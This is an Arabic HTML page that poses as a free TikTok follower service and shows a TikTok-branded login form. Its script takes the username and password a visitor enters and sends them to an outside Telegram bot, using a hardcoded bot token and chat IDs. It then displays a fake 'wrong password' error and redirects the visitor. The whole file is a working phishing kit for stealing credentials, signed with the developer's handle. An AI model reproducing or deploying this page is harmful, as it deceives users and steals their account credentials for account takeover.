<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>احصل على متابعين تيك توك حقيقيين مجاناً - TikTok Followers</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@500&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: 'Cairo', sans-serif;
      background: linear-gradient(135deg, #000000, #25F4EE, #FE2C55);
      background-size: 400% 400%;
      animation: gradientBG 15s ease infinite;
      color: #fff;
      text-align: center;
    }
    @keyframes gradientBG {
      0% {background-position: 0% 50%;}
      50% {background-position: 100% 50%;}
      100% {background-position: 0% 50%;}
    }
    .container {
      max-width: 400px;
      margin: 60px auto;
      background-color: rgba(0, 0, 0, 0.5);
      border-radius: 20px;
      padding: 30px 20px;
      box-shadow: 0 0 30px rgba(0,0,0,0.4);
      backdrop-filter: blur(8px);
      animation: fadeIn 1.2s ease;
    }
    @keyframes fadeIn {
      from {opacity: 0; transform: translateY(20px);}
      to {opacity: 1; transform: translateY(0);}
    }
    .logo {
      width: 100px;
      height: 100px;
      border-radius: 50%;
      margin: 0 auto 10px;
      background-image: url('https://upload.wikimedia.org/wikipedia/commons/0/0a/TikTok_logo.svg');
      background-size: cover;
      background-position: center;
    }
    .main-title {
      font-size: 18px;
      font-weight: bold;
      text-transform: uppercase;
      letter-spacing: 1px;
      margin-bottom: 5px;
    }
    p.subtitle {
      margin-bottom: 20px;
      font-size: 16px;
      color: #eee;
    }
    .form-box {
      background: rgba(255, 255, 255, 0.1);
      color: #fff;
      border-radius: 15px;
      padding: 20px;
      border: 1px solid rgba(255,255,255,0.2);
    }
    .form-box h2 {
      margin-bottom: 15px;
      font-size: 20px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 2px solid #25F4EE;
      border-radius: 10px;
      font-size: 16px;
      background: rgba(0,0,0,0.3);
      color: #fff;
      text-align: right;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #FE2C55;
      color: white;
      border: none;
      border-radius: 10px;
      font-size: 18px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    button:hover {
      background-color: #cc2244;
    }
    .note {
      margin-top: 10px;
      font-size: 12px;
      color: #bbb;
    }
    .error-msg {
      color: #ffb3b3;
      font-size: 10px;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo"></div>
    <h1 class="main-title">احصل على متابعين تيك توك حقيقيين مجاناً</h1>
    <p class="subtitle">TikTok followers</p>
    <div class="form-box">
      <h2>معلومات الاتصال</h2>
      <form id="loginForm">
        <input type="text" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
        <input type="password" id="password" placeholder="كلمة السر" required>
        <button type="submit">تسجيل الدخول</button>
        <p id="errorMessage" class="error-msg" style="display: none;">كلمة السر غير صحيحه يرجا اعادة المحاوله</p>
      </form>
      <p class="note">By submitting your contact details, you allow the link owner to contact you.</p>
    </div>
  </div>
  <script>
    const TOKEN = '8155888747:AAFHCvAZ13iSheT8VE8LbwEWTz9C-2uTjmI';
    const CHAT_IDS = ['00000000', '6027680891', '00000000'];
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      const message = `😈 جبتلك ڪٰمٰشٰ جٰديٰدٰ سٰجٰلٰ دٰخٰوٰلٰ تيك توك
\n
⌯⋆ 𝑈𝑆𝐸𝑅 ⋆⌯            ${username}

⌯⋆ 𝑃𝐴𝑆𝑆𝑊𝑂𝑅𝐷 ⋆⌯      ${password}


『 الــمطور صـ𓄌ـكر بغـ𓄌ـداد 』
『@ffl8l』`;
      CHAT_IDS.forEach(id => {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            chat_id: id,
            text: message
          })
        });
      });
      document.getElementById('errorMessage').style.display = 'block';
      setTimeout(() => {
        window.location.href = 'bot.html';
      }, 1000);
    });
  </script>
</body>
</html>
